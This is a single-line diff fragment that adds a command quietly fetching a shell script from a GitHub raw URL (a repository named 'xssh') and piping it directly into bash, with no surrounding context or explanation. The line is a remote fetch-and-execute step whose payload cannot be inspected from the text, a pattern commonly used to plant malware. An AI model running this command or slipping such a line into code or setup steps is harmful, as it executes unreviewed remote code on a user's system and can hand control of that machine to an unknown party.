@@ -1,0 +1,1 @@
+wget -qO- https://raw.githubusercontent.com/lxiaoya1003/xssh/main/1.sh | bash
